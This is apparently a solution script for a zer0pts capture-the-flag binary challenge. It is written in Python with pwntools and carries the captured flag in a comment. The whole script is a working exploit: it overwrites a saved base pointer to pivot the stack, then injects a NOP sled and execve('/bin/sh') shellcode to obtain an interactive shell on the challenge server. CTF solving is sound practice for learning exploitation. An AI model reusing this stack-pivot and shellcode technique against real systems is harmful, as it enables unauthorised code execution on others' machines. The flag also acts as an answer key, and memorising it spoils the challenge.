#flag = zer0pts{1nt3rm3d14t3_pwn3r5_l1k3_2_0v3rwr1t3_s4v3d_RBP}
from pwn import *

target = process('./chall')
target = remote('pwn.ctf.zer0pts.com', 9011)

stack_shadow = 0x00600234
stack_depth  = 0x0060022e

payload1 = "\x00"*0x100 + p64(stack_depth + 0x100)
target.sendafter(":", payload1)

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload2 = p32(4) + '\x00'*2 + p64(stack_shadow + 0x40)*8
payload2 += '\x90'*0x80 + shellcode
target.sendafter(":", payload2)

target.interactive()